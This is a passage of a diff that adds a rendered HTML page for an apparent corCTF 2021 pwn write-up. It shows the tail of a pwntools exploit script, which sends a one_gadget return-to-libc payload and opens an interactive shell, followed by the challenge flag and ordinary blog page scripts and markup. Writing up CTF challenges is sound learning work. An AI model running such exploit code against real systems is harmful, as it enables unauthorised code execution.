+</span><span>    log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">info</span><span>(</span><span style="color:#bae67e;">&quot;Address of libc </span><span style="color:#ffcc66;">%s </span><span style="color:#bae67e;">&quot; </span><span style="color:#f29e74;">% </span><span style="color:#f28779;">hex</span><span>(libc</span><span style="color:#f29e74;">.</span><span>address))
+</span><span>    payload </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">flat</span><span>({
+</span><span>        </span><span style="color:#ffcc66;">264</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffd580;">p64</span><span>(libc</span><span style="color:#f29e74;">.</span><span>address </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0xde78f</span><span>) </span><span style="font-style:italic;color:#5c6773;"># one_gadget
+</span><span>    })
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(payload)
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># good luck pwning :)
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">interactive</span><span>()
+</span><span style="color:#ffa759;">if </span><span>__name__ </span><span style="color:#f29e74;">== </span><span style="color:#bae67e;">&quot;__main__&quot;</span><span>:
+</span><span>    </span><span style="color:#ffd580;">main</span><span>()
+</span></code></pre>
+<p>The flag is corctf{mi11i0nt0k3n_1s_n0t_a_scam_r1ght}</p>
+
+    </div>
+
+    
+    <div class="article-info">
+        
+        <div class="article-date">22 August 2021</div>
+        
+        <div class="article-taxonomies">
+            
+            
+                <ul class="article-tags">
+                    
+                    <li><a href="https://tsheinen.github.io/tags/pwn/">#pwn</a></li>
+                    
+                </ul>
+            
+        </div>
+    </div>
+
+</article>
+
+<script>
+window.onscroll = function() {
+    if (window.innerHeight + window.pageYOffset >= document.body.offsetHeight) {
+        var count = 200;
+        var defaults = {
+          origin: { y: 0.7 }
+        };
+
+        function fire(particleRatio, opts) {
+          confetti(Object.assign({}, defaults, opts, {
+            particleCount: Math.floor(count * particleRatio)
+          }));
+        }
+
+        fire(0.25, {
+          spread: 26,
+          startVelocity: 55,
+        });
+        fire(0.2, {
+          spread: 60,
+        });
+        fire(0.35, {
+          spread: 100,
+          decay: 0.91,
+          scalar: 0.8
+        });
+        fire(0.1, {
+          spread: 120,
+          startVelocity: 25,
+          decay: 0.92,
+          scalar: 1.2
+        });
+        fire(0.1, {
+          spread: 120,
+          startVelocity: 45,
+        });
+    }
+}
+</script>
+<script type="text/javascript" src="/js/navbar.js"></script>
+
+
+        </main>
+        <footer>
+            
+            
+        </footer>
+    </div>
+
+
+
+    <details data-popover="up" style="right: 20px;top: 20px;">
+      <summary>
+		  <svg class="paint-roller" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="paint-roller" class="svg-inline--fa fa-paint-roller fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M416 128V32c0-17.67-14.33-32-32-32H32C14.33 0 0 14.33 0 32v96c0 17.67 14.33 32 32 32h352c17.67 0 32-14.33 32-32zm32-64v128c0 17.67-14.33 32-32 32H256c-35.35 0-64 28.65-64 64v32c-17.67 0-32 14.33-32 32v128c0 17.67 14.33 32 32 32h64c17.67 0 32-14.33 32-32V352c0-17.67-14.33-32-32-32v-32h160c53.02 0 96-42.98 96-96v-64c0-35.35-28.65-64-64-64z"/></svg>
+      </summary>
+      <div class="swatch-container">
+          
+            <div class="swatch-child" onclick="setTheme('Dark')">
+                <div style="text-align: center;">
+                  <div data-theme=Dark class="swatch">
+                    <div style="height: 100%; width:25%; background-color: var(--background-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--foreground-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color-alt, #000000)"></div>
+                  </div>
+                  <span style="color:  var(--background-color, #000000)"> Dark </span>
+              </div>
+            </div>
+          
+            <div class="swatch-child" onclick="setTheme('Light')">
+                <div style="text-align: center;">
+                  <div data-theme=Light class="swatch">
+                    <div style="height: 100%; width:25%; background-color: var(--background-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--foreground-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color-alt, #000000)"></div>
+                  </div>
+                  <span style="color:  var(--background-color, #000000)"> Light </span>
+              </div>
+            </div>
+          
+      </div>
+    </details>
+
+    <!-- Cloudflare Web Analytics -->
+    <script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "1e533cda4e344b0bb7c6bf7aef70a519"}'></script>
+    <!-- End Cloudflare Web Analytics -->
+
+    <script type="text/javascript" src="https://tsheinen.github.io/elasticlunr.min.js"></script>
+    <script type="text/javascript" src="https://tsheinen.github.io/search_index.en.js"></script>
+    <script type="text/javascript" src="https://tsheinen.github.io/js/search.js"></script>
+</body>
+</html>
